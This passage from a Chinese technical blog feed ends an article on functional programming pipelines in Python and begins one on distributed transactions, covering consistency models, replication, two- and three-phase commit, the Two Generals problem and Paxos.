<p>我们还可以看到，for循环被递归取代了（见race函数）—— 递归是函数式编程中带用到的技术，正如前面所说的，递归的本质就是描述问题是什么。</p>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="Pipeline"></span>Pipeline<span class="ez-toc-section-end"></span>
</h4>
<p>pipeline 管道借鉴于Unix Shell的管道操作——把若干个命令串起来，前面命令的输出成为后面命令的输入，如此完成一个流式计算。（注：管道绝对是一个伟大的发明，他的设哲学就是KISS – 让每个功能就做一件事，并把这件事做到极致，软件或程序的拼装会变得更为简单和直观。这个设计理念影响非常深远，包括今天的Web Service，云计算，以及大数据的流式计算等等）</p>
<p>比如，我们如下的shell命令：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">ps auwwx | awk '{print $2}' | sort -n | xargs echo</pre>
<p>如果我们抽象成函数式的语言，就像下面这样：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">xargs( echo, sort(n, awk('print $2', ps(auwwx))) )</pre>
<p>也可以类似下面这个样子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">pids = for_each(result, [ps_auwwx, awk_p2, sort_n, xargs_echo])</pre>
<p>好了，让我们来看看函数式编程的Pipeline怎么玩？</p>
<p>我们先来看一个如下的程序，这个程序的process()有三个步骤：</p>
<p style="padding-left: 30px;">1）找出偶数。<br>
2）乘以3<br>
3）转成字符串返回</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def process(num):
    # filter out non-evens
    if num % 2 != 0:
        return
    num = num * 3
    num = 'The Number: %s' % num
    return num

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

for num in nums:
    print process(num)

# 输出：
# None
# The Number: 6
# None
# The Number: 12
# None
# The Number: 18
# None
# The Number: 24
# None
# The Number: 30</pre>
<p>我们可以看到，输出的并不够完美，另外，代码阅读上如果没有注释，你也会比较晕。下面，我们来看看函数式的pipeline（第一种方式）应该怎么写？</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def even_filter(nums):
    for num in nums:
        if num % 2 == 0:
            yield num
def multiply_by_three(nums):
    for num in nums:
        yield num * 3
def convert_to_string(nums):
    for num in nums:
        yield 'The Number: %s' % num

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
pipeline = convert_to_string(multiply_by_three(even_filter(nums)))
for num in pipeline:
    print num
# 输出：
# The Number: 6
# The Number: 12
# The Number: 18
# The Number: 24
# The Number: 30</pre>
<p>我们动用了Python的关键字 yield，这个关键字主要是返回一个Generator，yield 是一个类似 return 的关键字，只是这个函数返回的是个Generator-生成器。所谓生成器的意思是，yield返回的是一个可迭代的对象，并没有真正的执行函数。也就是说，只有其返回的迭代对象被真正迭代时，yield函数才会正真的运行，运行到yield语句时就会停住，然后等下一次的迭代。（这个是个比较诡异的关键字）这就是lazy evluation。</p>
<p>好了，根据前面的原则——“<strong>使用Map &amp; Reduce，不要使用循环</strong>”，那我们用比较纯朴的Map &amp; Reduce吧。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def even_filter(nums):
    return filter(lambda x: x%2==0, nums)

def multiply_by_three(nums):
    return map(lambda x: x*3, nums)

def convert_to_string(nums):
    return map(lambda x: 'The Number: %s' % x,  nums)

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
pipeline = convert_to_string(
               multiply_by_three(
                   even_filter(nums)
               )
            )
for num in pipeline:
    print num</pre>
<p>但是他们的代码需要嵌套使用函数，这个有点不爽，如果我们能像下面这个样子就好了（第二种方式）。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">pipeline_func(nums, [even_filter,
                     multiply_by_three,
                     convert_to_string])</pre>
<p>那么，pipeline_func 实现如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def pipeline_func(data, fns):
    return reduce(lambda a, x: x(a),
                  fns,
                  data)</pre>
<p>好了，在读过这么多的程序后，你可以回头看一下这篇文章的开头对函数式编程的描述，可能你就更有感觉了。</p>
<p>最后，<span style="color: #cc0000;"><strong>我希望这篇浅显易懂的文章能让你感受到函数式编程的思想，就像OO编程，泛型编程，过程式编程一样，我们不用太纠结是不是我们的程序就是OO，就是functional的，我们重要的品味其中的味道</strong></span>。</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>Wikipedia: <a href="https://en.wikipedia.org/wiki/Functional_programming" target="_blank" rel="noopener noreferrer">Functional Programming</a>
</li>
<li><a href="https://stackoverflow.com/questions/5226055/truly-understanding-the-difference-between-procedural-and-functional" target="_blank" rel="noopener noreferrer">truly understanding the difference between procedural and functional</a></li>
<li><a style="line-height: 1.5em;" href="http://maryrosecook.com/post/a-practical-introduction-to-functional-programming" target="_blank" rel="bookmark noopener noreferrer">A practical introduction to functional programming</a></li>
<li><a href="https://stackoverflow.com/q/23277/211232" target="_blank" rel="noopener noreferrer">What is the difference between procedural programming and functional programming?</a></li>
<li><a href="https://stackoverflow.com/q/3249863/211232" target="_blank" rel="noopener noreferrer">Can someone give me examples of functional programming vs imperative/procedural programming?</a></li>
<li><a href="https://stackoverflow.com/q/552336/211232" target="_blank" rel="noopener noreferrer">OOP vs Functional Programming vs Procedural</a></li>
<li>Python – <a href="https://docs.python.org/2/howto/functional.html#" target="_blank" rel="noopener noreferrer">Functional Programming HOWTO</a>
</li>
</ul>
<p><strong>补充</strong>：评论中<a title="redraiment" href="https://weibo.com/redraiment">redraiment</a>的<a href="https://coolshell.cn/articles/10822.html#comment-1111518">这个评论</a>大家也可以读一读。</p>
<p>感谢谢网友S142857 提供的shell风格的python pipeline：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">class Pipe(object):
    def __init__(self, func):
        self.func = func

    def __ror__(self, other):
        def generator():
            for obj in other:
                if obj is not None:
                    yield self.func(obj)
        return generator()

@Pipe
def even_filter(num):
    return num if num % 2 == 0 else None

@Pipe
def multiply_by_three(num):
    return num*3

@Pipe
def convert_to_string(num):
    return 'The Number: %s' % num

@Pipe
def echo(item):
    print item
    return item

def force(sqs):
    for item in sqs: pass

nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

force(nums | even_filter | multiply_by_three | convert_to_string | echo)</pre>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-12-27T08:11:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/10822.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 分布式系统的事务处理 ]]></title>
<link>https://coolshell.cn/articles/10910.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >当我们在生产线上用一台服务器来提供数据服务的时候，我会遇到如下的两个问题：</p>
<p style="padding-left: 30px;">1）一台服务器的性能不足以提供足够的能力服务于所有的网络请求。</p>
<p style="padding-left: 30px;">2）我们总是害怕我们的这台服务器停机，造成服务不可用或是数据丢失。</p>
<p>于是我们不得不对我们的服务器进行扩展，加入更多的机器来分担性能上的问题，以及来解决单点故障问题。 通常，我们会通过两种手段来扩展我们的数据服务：</p>
<p style="padding-left: 30px;">1）<strong>数据分区</strong>：就是把数据分块放在不同的服务器上（如：uid % 16，一致性哈希等）。</p>
<p style="padding-left: 30px;">2）<strong>数据镜像</strong>：让所有的服务器都有相同的数据，提供相当的服务。</p>
<p>对于第一种情况，我们无法解决数据丢失的问题，单台服务器出问题时，会有部分数据丢失。所以，<strong>数据服务的高可用性只能通过第二种方法来完成——数据的冗余存储</strong>（一般工业界认为比较安全的备份数应该是3份，如：Hadoop和Dynamo）<strong>。 但是，加入更多的机器，会让我们的数据服务变得很复杂，尤其是跨服务器的事务处理，也就是跨服务器的数据一致性</strong>。这个是一个很难的问题。 让我们用最经典的Use Case：“A帐号向B帐号汇钱”来说明一下，熟悉RDBMS事务的都知道从帐号A到帐号B需要6个操作：</p>
<ol>
<li>从A帐号中把余额读出来。</li>
<li>对A帐号做减法操作。</li>
<li>把结果写回A帐号中。</li>
<li>从B帐号中把余额读出来。</li>
<li>对B帐号做加法操作。</li>
<li>把结果写回B帐号中。</li>
</ol>
<p>为了数据的一致性，这6件事，要么都成功做完，要么都不成功，而且这个操作的过程中，对A、B帐号的其它访问必需锁死，所谓锁死就是要排除其它的读写操作，不然会有脏数据的问题，这就是事务。那么，我们在加入了更多的机器后，这个事情会变得复杂起来：</p>
<p><span id="more-10910"></span></p>
<p style="padding-left: 30px;">1）<strong>在数据分区的方案中</strong>：如果A帐号和B帐号的数据不在同一台服务器上怎么办？我们需要一个跨机器的事务处理。也就是说，如果A的扣钱成功了，但B的加钱不成功，我们还要把A的操作给回滚回去。这在跨机器的情况下，就变得比较复杂了。</p>
<p style="padding-left: 30px;">2）<strong>在数据镜像的方案中</strong>：A帐号和B帐号间的汇款是可以在一台机器上完成的，但是别忘了我们有多台机器存在A帐号和B帐号的副本。如果对A帐号的汇钱有两个并发操作（要汇给B和C），这两个操作发生在不同的两台服务器上怎么办？也就是说，在数据镜像中，在不同的服务器上对同一个数据的写操作怎么保证其一致性，保证数据不冲突？</p>
<p>同时，我们还要考虑性能的因素，如果不考虑性能的话，事务得到保证并不困难，系统慢一点就行了。除了考虑性能外，我们还要考虑可用性，也就是说，一台机器没了，数据不丢失，服务可由别的机器继续提供。 于是，我们需要重点考虑下面的这么几个情况：</p>
<p style="padding-left: 30px;">1）<strong>容灾</strong>：数据不丢、结点的Failover</p>
<p style="padding-left: 30px;">2）<strong>数据的一致性</strong>：事务处理</p>
<p style="padding-left: 30px;">3）<strong>性能：吞吐量 、 响应时间</strong></p>
<p>前面说过，要解决数据不丢，只能通过数据冗余的方法，就算是数据分区，每个区也需要进行数据冗余处理。这就是数据副本：当出现某个节点的数据丢失时可以从副本读到，数据副本是分布式系统解决数据丢失异常的唯一手段。所以，在这篇文章中，简单起见，我们只讨论在数据冗余情况下考虑数据的一致性和性能的问题。简单说来：</p>
<p style="padding-left: 30px;"><strong>1）要想让数据有高可用性，就得写多份数据。</strong></p>
<p style="padding-left: 30px;"><strong>2）写多份的问题会导致数据一致性的问题。</strong></p>
<p style="padding-left: 30px;"><strong>3）数据一致性的问题又会引发性能问题</strong></p>
<p>这就是软件开发，按下了葫芦起了瓢。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E8%87%B4%E6%80%A7%E6%A8%A1%E5%9E%8B" title="一致性模型">一致性模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Master-Slave" title="Master-Slave">Master-Slave</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Master-Master" title="Master-Master">Master-Master</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#TwoThree_Phase_Commit" title="Two/Three Phase Commit">Two/Three Phase Commit</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Two_Generals_Problem%EF%BC%88%E4%B8%A4%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98%EF%BC%89" title="Two Generals Problem（两将军问题）">Two Generals Problem（两将军问题）</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Paxos%E7%AE%97%E6%B3%95" title="Paxos算法">Paxos算法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#NWR%E6%A8%A1%E5%9E%8B" title="NWR模型">NWR模型</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E8%87%B4%E6%80%A7%E6%A8%A1%E5%9E%8B"></span>一致性模型<span class="ez-toc-section-end"></span>
</h4>
<p>说起数据一致性来说，简单说有三种类型（当然，如果细分的话，还有很多一致性模型，如：顺序一致性，FIFO一致性，会话一致性，单读一致性，单写一致性，但为了本文的简单易读，我只说下面三种）：</p>
<p style="padding-left: 30px;">1）<strong>Weak 弱一致性</strong>：当你写入一个新值后，读操作在数据副本上可能读出来，也可能读不出来。比如：某些cache系统，网络游戏其它玩家的数据和你没什么关系，VOIP这样的系统，或是百度搜索引擎（呵呵）。</p>
<p style="padding-left: 30px;">2）<strong>Eventually 最终一致性</strong>：当你写入一个新值后，有可能读不出来，但在某个时间窗口之后保证最终能读出来。比如：DNS，电子邮件、Amazon S3，Google搜索引擎这样的系统。</p>
<p style="padding-left: 30px;">3）<strong>Strong 强一致性</strong>：新的数据一旦写入，在任意副本任意时刻都能读到新值。比如：文件系统，RDBMS，Azure Table都是强一致性的。</p>
<p>从这三种一致型的模型上来说，我们可以看到，Weak和Eventually一般来说是异步冗余的，而Strong一般来说是同步冗余的，异步的通常意味着更好的性能，但也意味着更复杂的状态控制。同步意味着简单，但也意味着性能下降。 好，让我们由浅入深，一步一步地来看有哪些技术：</p>
<h4>
<span class="ez-toc-section" id="Master-Slave"></span>Master-Slave<span class="ez-toc-section-end"></span>
</h4>
<p>首先是Master-Slave结构，对于这种加构，Slave一般是Master的备份。在这样的系统中，一般是如下设计的：</p>
<p style="padding-left: 30px;">1）读写请求都由Master负责。</p>
<p style="padding-left: 30px;">2）写请求写到Master上后，由Master同步到Slave上。</p>
<p>从Master同步到Slave上，你可以使用异步，也可以使用同步，可以使用Master来push，也可以使用Slave来pull。 通常来说是Slave来周期性的pull，所以，是最终一致性。这个设计的问题是，如果Master在pull周期内垮掉了，那么会导致这个时间片内的数据丢失。如果你不想让数据丢掉，Slave只能成为Read-Only的方式等Master恢复。</p>
<p>当然，如果你可以容忍数据丢掉的话，你可以马上让Slave代替Master工作（对于只负责计算的结点来说，没有数据一致性和数据丢失的问题，Master-Slave的方式就可以解决单点问题了） 当然，Master Slave也可以是强一致性的， 比如：当我们写Master的时候，Master负责先写自己，等成功后，再写Slave，两者都成功后返回成功，整个过程是同步的，如果写Slave失败了，那么两种方法，一种是标记Slave不可用报错并继续服务（等Slave恢复后同步Master的数据，可以有多个Slave，这样少一个，还有备份，就像前面说的写三份那样），另一种是回滚自己并返回写失败。（注：一般不先写Slave，因为如果写Master自己失败后，还要回滚Slave，此时如果回滚Slave失败，就得手工订正数据了）你可以看到，如果Master-Slave需要做成强一致性有多复杂。</p>
<h4>
<span class="ez-toc-section" id="Master-Master"></span>Master-Master<span class="ez-toc-section-end"></span>
</h4>
<p>Master-Master，又叫<a href="https://en.wikipedia.org/wiki/Multi-master_replication" target="_blank">Multi-master</a>，是指一个系统存在两个或多个Master，每个Master都提供read-write服务。这个模型是Master-Slave的加强版，数据间同步一般是通过Master间的异步完成，所以是最终一致性。 Master-Master的好处是，一台Master挂了，别的Master可以正常做读写服务，他和Master-Slave一样，当数据没有被复制到别的Master上时，数据会丢失。很多数据库都支持Master-Master的Replication的机制。</p>
<p>另外，如果多个Master对同一个数据进行修改的时候，这个模型的恶梦就出现了——对数据间的冲突合并，这并不是一件容易的事情。看看Dynamo的Vector Clock的设计（记录数据的版本号和修改者）就知道这个事并不那么简单，而且Dynamo对数据冲突这个事是交给用户自己搞的。就像我们的SVN源码冲突一样，对于同一行代码的冲突，只能交给开发者自己来处理。（在本文后后面会讨论一下Dynamo的Vector Clock）</p>
<h4>
<span class="ez-toc-section" id="TwoThree_Phase_Commit"></span>Two/Three Phase Commit<span class="ez-toc-section-end"></span>
</h4>
<p>这个协议的缩写又叫2PC，中文叫两阶段提交。在分布式系统中，每个节点虽然可以知晓自己的操作时成功或者失败，却无法知道其他节点的操作的成功或失败。当一个事务跨越多个节点时，为了保持事务的ACID特性，需要引入一个作为<strong>协调者</strong>的组件来统一掌控所有节点(称作<b>参与者</b>)的操作结果并最终指示这些节点是否要把操作结果进行真正的提交(比如将更新后的数据写入磁盘等等)。 两阶段提交的算法如下：</p>
<p><strong> 第一阶段</strong>：</p>
<ol>
<li>协调者会问所有的参与者结点，是否可以执行提交操作。</li>
<li>各个参与者开始事务执行的准备工作：如：为资源上锁，预留资源，写undo/redo log……</li>
<li>参与者响应协调者，如果事务的准备工作成功，则回应“可以提交”，否则回应“拒绝提交”。</li>
</ol>
<p><strong>第二阶段</strong>：</p>
<ul>
<li>如果所有的参与者都回应“可以提交”，那么，协调者向所有的参与者发送“正式提交”的命令。参与者完成正式提交，并释放所有资源，然后回应“完成”，协调者收集各结点的“完成”回应后结束这个Global Transaction。</li>
</ul>
<ul>
<li>如果有一个参与者回应“拒绝提交”，那么，协调者向所有的参与者发送“回滚操作”，并释放所有资源，然后回应“回滚完成”，协调者收集各结点的“回滚”回应后，取消这个Global Transaction。</li>
</ul>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>我们可以看到，2PC说白了就是第一阶段做Vote，第二阶段做决定的一个算法，也可以看到2PC这个事是强一致性的算法。在前面我们讨论过Master-Slave的强一致性策略，和2PC有点相似，只不过2PC更为保守一些——先尝试再提交。 2PC用的是比较多的，在一些系统设计中，会串联一系列的调用，比如：A -&gt; B -&gt; C -&gt; D，每一步都会分配一些资源或改写一些数据。比如我们B2C网上购物的下单操作在后台会有一系列的流程需要做。如果我们一步一步地做，就会出现这样的问题，如果某一步做不下去了，那么前面每一次所分配的资源需要做反向操作把他们都回收掉，所以，操作起来比较复杂。现在很多处理流程（Workflow）都会借鉴2PC这个算法，使用 try -&gt; confirm的流程来确保整个流程的能够成功完成。 举个通俗的例子，西方教堂结婚的时候，都有这样的桥段：</p>
<p style="padding-left: 30px;">1）牧师分别问新郎和新娘：你是否愿意……不管生老病死……（询问阶段）</p>
<p style="padding-left: 30px;">2）当新郎和新娘都回答愿意后（锁定一生的资源），牧师就会说：我宣布你们……（事务提交）</p>
<p>这是多么经典的一个两阶段提交的事务处理。 另外，我们也可以看到其中的一些问题， A）其中一个是同步阻塞操作，这个事情必然会非常大地影响性能。 B）另一个主要的问题是在TimeOut上，比如，</p>
<p style="padding-left: 30px;">1）如果第一阶段中，参与者没有收到询问请求，或是参与者的回应没有到达协调者。那么，需要协调者做超时处理，一旦超时，可以当作失败，也可以重试。</p>
<p style="padding-left: 30px;">2）如果第二阶段中，正式提交发出后，如果有的参与者没有收到，或是参与者提交/回滚后的确认信息没有返回，一旦参与者的回应超时，要么重试，要么把那个参与者标记为问题结点剔除整个集群，这样可以保证服务结点都是数据一致性的。</p>
<p style="padding-left: 30px;">3）糟糕的情况是，第二阶段中，如果参与者收不到协调者的commit/fallback指令，参与者将处于“状态未知”阶段，参与者完全不知道要怎么办，比如：如果所有的参与者完成第一阶段的回复后（可能全部yes，可能全部no，可能部分yes部分no），如果协调者在这个时候挂掉了。那么所有的结点完全不知道怎么办（问别的参与者都不行）。为了一致性，要么死等协调者，要么重发第一阶段的yes/no命令。</p>
<p>两段提交最大的问题就是第3）项，<strong>如果第一阶段完成后，参与者在第二阶没有收到决策，那么数据结点会进入“不知所措”的状态，这个状态会block住整个事务</strong>。也就是说，协调者Coordinator对于事务的完成非常重要，Coordinator的可用性是个关键。 因些，我们引入三段提交，三段提交在<a href="https://en.wikipedia.org/wiki/Three-phase_commit_protocol" target="_blank">Wikipedia</a>上的描述如下，他把二段提交的第一个段break成了两段：询问，然后再锁资源。最后真正提交。三段提交的示意图如下：</p>
<p style="padding-left: 30px;"><img alt="image placeholder" ></p>
<p>三段提交的核心理念是：<strong>在询问的时候并不锁定资源，除非所有人都同意了，才开始锁资源</strong>。</p>
<p style="text-align: left;">理论上来说，如果第一阶段所有的结点返回成功，那么有理由相信成功提交的概率很大。这样一来，可以降低参与者Cohorts的状态未知的概率。也就是说，一旦参与者收到了PreCommit，意味他知道大家其实都同意修改了。这一点很重要。下面我们来看一下3PC的状态迁移图：（<strong>注意图中的虚线，那些F,T是Failuer或Timeout</strong>，其中的：状态含义是 q – Query，a – Abort，w – Wait，p – PreCommit，c – Commit）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">从上图的状态变化图我们可以从虚线（那些F,T是Failuer或Timeout）看到——<strong>如果结点处在P状态（PreCommit）的时候发生了F/T的问题，三段提交比两段提交的好处是，三段提交可以继续直接把状态变成C状态（Commit），而两段提交则不知所措</strong>。</p>
<p style="text-align: left;">其实，三段提交是一个很复杂的事情，实现起来相当难，而且也有一些问题。</p>
<p style="text-align: left;">看到这里，我相信你有很多很多的问题，你一定在思考2PC/3PC中各种各样的失败场景，<strong>你会发现Timeout是个非常难处理的事情，因为网络上的Timeout在很多时候让你无所事从，你也不知道对方是做了还是没有做。于是你好好的一个状态机就因为Timeout成了个摆设</strong>。</p>
<p style="text-align: left;"><strong>一个网络服务会有三种状态：1）Success，2）Failure，3）Timeout，第三个绝对是恶梦，尤其在你需要维护状态的时候</strong>。</p>
<h4>
<span class="ez-toc-section" id="Two_Generals_Problem%EF%BC%88%E4%B8%A4%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98%EF%BC%89"></span>Two Generals Problem（两将军问题）<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/Two_Generals'_Problem" target="_blank">Two Generals Problem</a> 两将军问题是这么一个思维性实验问题： 有两支军队，它们分别有一位将军领导，现在准备攻击一座修筑了防御工事的城市。这两支军队都驻扎在那座城市的附近，分占一座山头。一道山谷把两座山分隔开来，并且两位将军唯一的通信方式就是派各自的信使来往于山谷两边。不幸的是，这个山谷已经被那座城市的保卫者占领，并且存在一种可能，那就是任何被派出的信使通过山谷是会被捕。 请注意，虽然两位将军已经就攻击那座城市达成共识，但在他们各自占领山头阵地之前，并没有就进攻时间达成共识。两位将军必须让自己的军队同时进攻城市才能取得成功。因此，他们必须互相沟通，以确定一个时间来攻击，并同意就在那时攻击。如果只有一个将军进行攻击，那么这将是一个灾难性的失败。 这个思维实验就包括考虑他们如何去做这件事情。下面是我们的思考：</p>
<p style="padding-left: 30px;">1）第一位将军先发送一段消息“让我们在上午9点开始进攻”。然而，一旦信使被派遣，他是否通过了山谷，第一位将军就不得而知了。任何一点的不确定性都会使得第一位将军攻击犹豫，因为如果第二位将军不能在同一时刻发动攻击，那座城市的驻军就会击退他的军队的进攻，导致他的军对被摧毁。</p>
<p style="padding-left: 30px;">2）知道了这一点，第二位将军就需要发送一个确认回条：“我收到您的邮件，并会在9点的攻击。”但是，如果带着确认消息的信使被抓怎么办？所以第二位将军会犹豫自己的确认消息是否能到达。</p>
<p style="padding-left: 30px;">3）于是，似乎我们还要让第一位将军再发送一条确认消息——“我收到了你的确认”。然而，如果这位信使被抓怎么办呢？</p>
<p style="padding-left: 30px;">4）这样一来，是不是我们还要第二位将军发送一个“确认收到你的确认”的信息。</p>
<p>靠，于是你会发现，这事情很快就发展成为不管发送多少个确认消息，都没有办法来保证两位将军有足够的自信自己的信使没有被敌军捕获。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><strong style="line-height: 1.5em;">这个问题是无解的</strong><span style="line-height: 1.5em;">。</span><span style="line-height: 1.5em;">两个将军问题和它的无解证明首先由E.A.Akkoyunlu,K.Ekanadham和R.V.Huber于1975年在《一些限制与折衷的网络通信设计》一文中发表，就在这篇文章的第73页中一段描述两个黑帮之间的通信中被阐明。 1978年，在Jim Gray的《数据库操作系统注意事项》一书中（从第465页开始）被命名为两个将军悖论。作为两个将军问题的定义和无解性的证明的来源，这一参考被广泛提及。</span></p>
<p style="text-align: left;">这个实验意在阐明：试图通过建立在一个不可靠的连接上的交流来协调一项行动的隐患和设计上的巨大挑战。</p>
<p style="text-align: left;">从工程上来说，一个解决两个将军问题的实际方法是使用一个能够承受通信信道不可靠性的方案，并不试图去消除这个不可靠性，但要将不可靠性削减到一个可以接受的程度。比如，第一位将军排出了100位信使并预计他们都被捕的可能性很小。在这种情况下，不管第二位将军是否会攻击或者受到任何消息，第一位将军都会进行攻击。另外，第一位将军可以发送一个消息流，而第二位将军可以对其中的每一条消息发送一个确认消息，这样如果每条消息都被接收到，两位将军会感觉更好。然而我们可以从证明中看出，他们俩都不能肯定这个攻击是可以协调的。他们没有算法可用（比如，收到4条以上的消息就攻击）能够确保防止仅有一方攻击。再者，第一位将军还可以为每条消息编号，说这是1号，2号……直到n号。这种方法能让第二位将军知道通信信道到底有多可靠，并且返回合适的数量的消息来确保最后一条消息被接收到。如果信道是可靠的话，只要一条消息就行了，其余的就帮不上什么忙了。最后一条和第一条消息丢失的概率是相等的。</p>
<p> 两将军问题可以扩展成更变态的<strong>拜占庭将军问题 (Byzantine Generals Problem)</strong>，其故事背景是这样的：拜占庭位于现在土耳其的伊斯坦布尔，是东罗马帝国的首都。由于当时拜占庭罗马帝国国土辽阔，为了防御目的，因此每个军队都分隔很远，将军与将军之间只能靠信差传消息。 在战争的时候，拜占庭军队内所有将军必需达成一致的共识，决定是否有赢的机会才去攻打敌人的阵营。但是，军队可能有叛徒和敌军间谍，这些叛徒将军们会扰乱或左右决策的过程。这时候，在已知有成员谋反的情况下，其余忠诚的将军在不受叛徒的影响下如何达成一致的协议，这就是拜占庭将军问题。</p>
<h4>
<span class="ez-toc-section" id="Paxos%E7%AE%97%E6%B3%95"></span>Paxos算法<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://en.wikipedia.org/wiki/Paxos_(computer_science)" target="_blank">Wikipedia上的各种Paxos算法</a>的描述非常详细，大家可以去围观一下。</p>
<p>Paxos 算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个「一致性算法」以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。从20世纪80年代起对于一致性算法的研究就没有停止过。</p>
<p><strong>Notes</strong>：Paxos算法是莱斯利·兰伯特（Leslie Lamport，就是 LaTeX 中的”La”，此人现在在微软研究院）于1990年提出的一种基于消息传递的一致性算法。由于算法难以理解起初并没有引起人们的重视，使Lamport在八年后1998年重新发表到ACM Transactions on Computer Systems上（<a href="http://research.microsoft.com/users/lamport/pubs/lamport-paxos.pdf" rel="nofollow">The Part-Time Parliament</a>）。即便如此paxos算法还是没有得到重视，2001年Lamport 觉得同行无法接受他的幽默感，于是用容易接受的方法重新表述了一遍（<a href="http://research.microsoft.com/users/lamport/pubs/paxos-simple.pdf" rel="nofollow">Paxos Made Simple</a>）。可见Lamport对Paxos算法情有独钟。近几年Paxos算法的普遍使用也证明它在分布式一致性算法中的重要地位。2006年Google的三篇论文初现“云”的端倪，其中的Chubby Lock服务使用Paxos作为Chubby Cell中的一致性算法，Paxos的人气从此一路狂飙。（Lamport 本人在 <a href="http://research.microsoft.com/users/lamport/pubs/pubs.html#lamport-paxos" target="_blank">他的blog 中</a>描写了他用9年时间发表这个算法的前前后后）</p>
<p>注：Amazon的AWS中，所有的云服务都基于一个ALF（Async Lock Framework）的框架实现的，这个ALF用的就是Paxos算法。我在Amazon的时候，看内部的分享视频时，设计者在内部的Principle Talk里说他参考了ZooKeeper的方法，但他用了另一种比ZooKeeper更易读的方式实现了这个算法。</p>
<p>简单说来，Paxos的目的是让整个集群的结点对某个值的变更达成一致。Paxos算法基本上来说是个民主选举的算法——大多数的决定会成个整个集群的统一决定。任何一个点都可以提出要修改某个数据的提案，是否通过这个提案取决于这个集群中是否有超过半数的结点同意（所以Paxos算法需要集群中的结点是单数）。</p>
<p><span style="line-height: 1.5em;">这个算法有两个阶段（假设这个有三个结点：A，B，C）：</span></p>
<p style="padding-left: 30px;"><strong>第一阶段：Prepare阶段</strong></p>
<p style="padding-left: 30px;">A把申请修改的请求Prepare Request发给所有的结点A，B，C。注意，Paxos算法会有一个Sequence Number（你可以认为是一个提案号，这个数不断递增，而且是唯一的，也就是说A和B不可能有相同的提案号），这个提案号会和修改请求一同发出，任何结点在“Prepare阶段”时都会拒绝其值小于当前提案号的请求。所以，结点A在向所有结点申请修改请求的时候，需要带一个提案号，越新的提案，这个提案号就越是是最大的。</p>
<p style="padding-left: 30px;">如果接收结点收到的提案号n大于其它结点发过来的提案号，这个结点会回应Yes（本结点上最新的被批准提案号），并保证不接收其它&lt;n的提案。这样一来，结点上在Prepare阶段里总是会对最新的提案做承诺。</p>
<p style="padding-left: 30px;">优化：在上述 prepare 过程中，如果任何一个结点发现存在一个更高编号的提案，则需要通知 提案人，提醒其中断这次提案。</p>
<p style="padding-left: 30px;"><strong>第二阶段：Accept阶段</strong></p>
<p style="padding-left: 30px;">如果提案者A收到了超过半数的结点返回的Yes，然后他就会向所有的结点发布Accept Request（同样，需要带上提案号n），如果没有超过半数的话，那就返回失败。</p>
<p style="padding-left: 30px;">当结点们收到了Accept Request后，如果对于接收的结点来说，n是最大的了，那么，它就会修改这个值，如果发现自己有一个更大的提案号，那么，结点就会拒绝修改。</p>
